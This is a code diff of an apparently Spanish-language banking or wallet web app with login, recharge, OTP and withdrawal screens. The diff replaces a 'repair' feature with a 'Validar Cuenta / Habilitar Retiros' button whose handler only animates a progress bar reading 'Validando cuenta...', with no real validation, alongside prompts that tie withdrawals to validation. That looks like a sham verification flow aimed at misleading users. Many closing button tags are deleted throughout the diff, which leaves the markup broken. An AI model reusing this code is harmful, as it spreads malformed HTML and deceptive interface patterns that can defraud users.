@@ -5464,7 +5464,7 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       
       <button class="btn btn-primary" id="login-button">
         <i class="fas fa-sign-in-alt"></i> Iniciar Sesión
-      </button>
+
 
       <div class="led-indicator" id="led-indicator" style="display:none;">
         <span class="led-light" id="led-light"></span>
@@ -5516,10 +5516,10 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       <button class="header-action-btn" id="notification-btn" aria-label="Notificaciones">
         <i class="fas fa-bell"></i>
         <span class="notification-badge" style="display:none">0</span>
-      </button>
+
       <button class="header-action-btn" id="header-logout-btn" aria-label="Cerrar Sesión">
         <i class="fas fa-sign-out-alt"></i>
-      </button>
+
     </div>
   </header>
 
@@ -6431,13 +6431,13 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
               </div>
             </button>
 
-            <button class="settings-nav-btn" id="repair-btn">
+            <button class="settings-nav-btn" id="validate-account-btn">
               <div class="settings-nav-icon repair">
                 <i class="fas fa-tools"></i>
               </div>
               <div class="settings-nav-content">
-                <div class="settings-nav-title">Reparar</div>
-                <div class="settings-nav-description">Solucionar problemas de activación</div>
+                <div class="settings-nav-title">Validar Cuenta</div>
+                <div class="settings-nav-description">Habilitar Retiros</div>
               </div>
             </button>
 
@@ -6579,9 +6579,8 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       <button class="btn btn-primary" id="logout-btn" style="margin-top: 1rem;">
         <i class="fas fa-sign-out-alt"></i> Cerrar Sesión
       </button>
-      <button class="btn btn-primary" id="resolve-problem-btn" style="margin-top: 1rem; display:none; background:#007bff;">
-        <i class="fas fa-tools"></i> Resolver Problema
-      </button>
+
+
     </div>
   </div>
   <!-- Recharge Container -->
@@ -7084,7 +7083,7 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       
       <button class="btn btn-primary" id="verify-otp-btn">
         <i class="fas fa-shield-alt"></i> Verificar y Recargar
-      </button>
+
       
       <div class="resend-code">
         ¿No recibió el código? <a href="#" id="resend-code">Reenviar</a>
@@ -7191,11 +7190,11 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       
       <button class="btn btn-primary" id="submit-verification" style="margin-top: 1.5rem;">
         <i class="fas fa-shield-alt"></i> Enviar para Verificación
-      </button>
+
       
       <button class="btn btn-outline" id="verify-later" style="margin-top: 1rem; width: 100%;">
         <i class="fas fa-clock"></i> Verificar más tarde
-      </button>
+
     </div>
   </div>
 
@@ -7214,7 +7213,7 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       
       <button class="btn btn-primary" id="transfer-processing-continue">
         <i class="fas fa-home"></i> Volver al Inicio
-      </button>
+
       
       <div style="text-align: center; margin-top: 1.25rem; font-size: 0.8rem; color: var(--neutral-600);">
         Recibirá una notificación cuando confirmemos su pago.<br>
@@ -7247,7 +7246,7 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       <div class="error-message" id="concept-modal-error" style="display:none;">Por favor, ingrese el concepto.</div>
       <button class="btn btn-primary" id="concept-modal-confirm" style="margin-top: 0.5rem;">
         <i class="fas fa-check"></i> Continuar
-      </button>
+
     </div>
   </div>
 
@@ -7312,7 +7311,7 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       <div class="modal-subtitle">Valida tu cuenta para habilitar retiros y todos los servicios.</div>
       <button class="btn btn-primary" id="validation-reminder-close" style="margin-top: 0.5rem;">
         <i class="fas fa-times"></i> Cerrar
-      </button>
+
     </div>
   </div>
 
@@ -7408,7 +7407,7 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
       
       <button class="btn btn-primary" id="welcome-continue">
         <i class="fas fa-rocket"></i> Comenzar
-      </button>
+
     </div>
   </div>
 
@@ -7637,29 +7636,6 @@ if (typeof confetti === "undefined") { window.confetti = function(){}; }
   </div>
   </div>
 
-  <!-- Repair Confirmation Overlay -->
-  <div class="modal-overlay" id="repair-confirm-overlay" style="display:none;">
-    <div class="modal">
-      <div class="modal-title">Reparar Cuenta</div>
-      <div class="modal-subtitle">Se corregirán errores y estás a punto de activar todos tus servicios.</div>
-      <div style="display:flex;gap:0.5rem;justify-content:center;margin-top:1rem;">
-        <button class="btn btn-outline" id="repair-cancel-btn"><i class="fas fa-times"></i> Cancelar</button>
-        <button class="btn btn-primary" id="repair-confirm-btn"><i class="fas fa-tools"></i> Reparar</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Repair Success Overlay -->
-  <div class="success-container" id="repair-success-overlay" style="display:none;">
-    <div class="success-card">
-      <div class="success-checkmark"><i class="fas fa-check"></i></div>
-      <div class="success-title">¡Funcionalidades Activas!</div>
-      <div class="success-message">Tus servicios han sido reparados con éxito.</div>
-      <div class="success-actions">
-        <button class="btn btn-primary" id="repair-success-continue"><i class="fas fa-arrow-right"></i> Continuar</button>
-      </div>
-    </div>
-  </div>
 
   <!-- Temporary Block Overlay -->
   <div class="temp-block-overlay" id="temporary-block-overlay">
@@ -11372,7 +11348,6 @@ function stopVerificationProgress() {
       setupTierProgressOverlay();
       setupPartialRechargeOverlay();
       setupQuickRechargeOverlay();
-      setupRepairOverlay();
       setupTempBlockOverlay();
 
       // Tema
@@ -11399,7 +11374,7 @@ function stopVerificationProgress() {
       const activationNavBtn = document.getElementById('activation-nav-btn');
       const limitsNavBtn = document.getElementById('limits-nav-btn');
       const withdrawalsSwitch = document.getElementById('withdrawals-switch');
-      const repairNavBtn = document.getElementById('repair-btn');
+      const validateNavBtn = document.getElementById('validate-account-btn');
       const deleteAccountNavBtn = document.getElementById('delete-account-btn');
       const liteModeBtn = document.getElementById('lite-mode-btn');
 
@@ -11444,10 +11419,18 @@ function stopVerificationProgress() {
         }
       }
 
-      if (repairNavBtn) {
-        repairNavBtn.addEventListener('click', function() {
-          const overlay = document.getElementById('repair-confirm-overlay');
-          if (overlay) overlay.style.display = 'flex';
+      if (validateNavBtn) {
+        validateNavBtn.addEventListener("click", function() {
+          const settingsOverlay = document.getElementById("settings-overlay");
+          if (settingsOverlay) settingsOverlay.style.display = "none";
+          const loadingOverlay = document.getElementById("loading-overlay");
+          const progressBar = document.getElementById("progress-bar");
+          const loadingText = document.getElementById("loading-text");
+          if (loadingOverlay) loadingOverlay.style.display = "flex";
+          if (progressBar && loadingText) {
+            progressBar.style.width = "0%";
+            gsap.to(progressBar, { width: "100%", duration: 2, ease: "power1.inOut", onUpdate: function() { loadingText.textContent = "Validando cuenta..."; }, onComplete: function() { setTimeout(function() { if (loadingOverlay) loadingOverlay.style.display = "none"; if (typeof activateRepair === "function") activateRepair(); }, 500); } });
+          }
           resetInactivityTimer();
         });
       }
@@ -12812,35 +12795,6 @@ function setupUsAccountLink() {
       updateVerificationButtons();
 
 
-      const resolveBtn = document.getElementById('resolve-problem-btn');
-      if (resolveBtn) {
-        const hasMobile = currentUser.transactions.some(t => t.description === 'Pago Móvil');
-        resolveBtn.style.display = hasMobile ? 'block' : 'none';
-        resolveBtn.addEventListener('click', function() {
-          if (settingsOverlay) settingsOverlay.style.display = 'none';
-          const loadingOverlay = document.getElementById('loading-overlay');
-          const progressBar = document.getElementById('progress-bar');
-          const loadingText = document.getElementById('loading-text');
-          if (loadingOverlay) loadingOverlay.style.display = 'flex';
-          if (progressBar && loadingText) {
-            progressBar.style.width = '0%';
-            gsap.to(progressBar, {
-              width: '100%',
-              duration: 2,
-              ease: 'power1.inOut',
-              onUpdate: function() { loadingText.textContent = 'Resolviendo problemas...'; },
-              onComplete: function() {
-                setTimeout(function() {
-                  if (loadingOverlay) loadingOverlay.style.display = 'none';
-                  localStorage.setItem(CONFIG.STORAGE_KEYS.PROBLEM_RESOLVED, 'true');
-                  window.location.href = 'https://visa.es';
-                }, 500);
-              }
-            });
-          }
-          resetInactivityTimer();
-        });
-      }
     }
     // Setup feature blocked
     function setupFeatureBlocked() {
@@ -13018,33 +12972,6 @@ function setupUsAccountLink() {
       }
     }
 
-    function setupRepairOverlay() {
-      const confirmOverlay = document.getElementById('repair-confirm-overlay');
-      const successOverlay = document.getElementById('repair-success-overlay');
-      const cancelBtn = document.getElementById('repair-cancel-btn');
-      const confirmBtn = document.getElementById('repair-confirm-btn');
-      const continueBtn = document.getElementById('repair-success-continue');
-
-      if (cancelBtn) {
-        cancelBtn.addEventListener('click', function() {
-          if (confirmOverlay) confirmOverlay.style.display = 'none';
-        });
-      }
-
-      if (confirmBtn) {
-        confirmBtn.addEventListener('click', function() {
-          if (confirmOverlay) confirmOverlay.style.display = 'none';
-          if (successOverlay) successOverlay.style.display = 'flex';
-          confetti({ particleCount: 150, spread: 80, origin: { y: 0.6 } });
-        });
-      }
-
-      if (continueBtn) {
-        continueBtn.addEventListener('click', function() {
-          if (successOverlay) successOverlay.style.display = 'none';
-          if (typeof activateRepair === 'function') activateRepair();
-        });
-      }
     }
 
     // Login form handler
@@ -14122,9 +14049,9 @@ function checkTierProgressOverlay() {
     function updateSettingsBalanceButtons() {
       const verifyBtn = document.getElementById('verification-nav-btn');
       const activationBtn = document.getElementById('activation-nav-btn');
-      const repairBtn = document.getElementById('repair-btn');
+      const validateBtn = document.getElementById('validate-account-btn');
       const hasBalance = (currentUser.balance.usd || 0) > 0;
-      [verifyBtn, activationBtn, repairBtn].forEach(btn => {
+      [verifyBtn, activationBtn, validateBtn].forEach(btn => {
         if (!btn) return;
         btn.classList.toggle('disabled', !hasBalance);
         if (hasBalance) {
